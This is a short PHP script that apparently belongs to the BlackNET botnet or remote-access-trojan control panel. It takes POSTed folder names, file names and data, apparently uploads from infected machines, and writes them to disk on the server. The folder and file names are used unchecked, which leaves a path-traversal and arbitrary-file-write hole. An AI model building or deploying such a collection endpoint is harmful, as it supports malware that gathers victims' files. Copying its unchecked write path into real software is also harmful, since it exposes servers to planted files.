<?php
header('Content-type: text/html; charset=utf-8');

require_once 'config/config.php';
require_once APP_PATH . 'classes/POST.php';

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $POST = new BlackNET\POST();
    $folder_name = isset($_POST['folder_name']) && $_POST['folder_name'] != "" ? $_POST['folder_name'] : 'www';
    $file_name = isset($_POST['file_name']) ? $_POST['file_name'] : "unknown.txt";

    $data = $POST->sanitize($_POST['data']);

    $POST->prepare($folder_name, $file_name, $data);

    $POST->write();
}
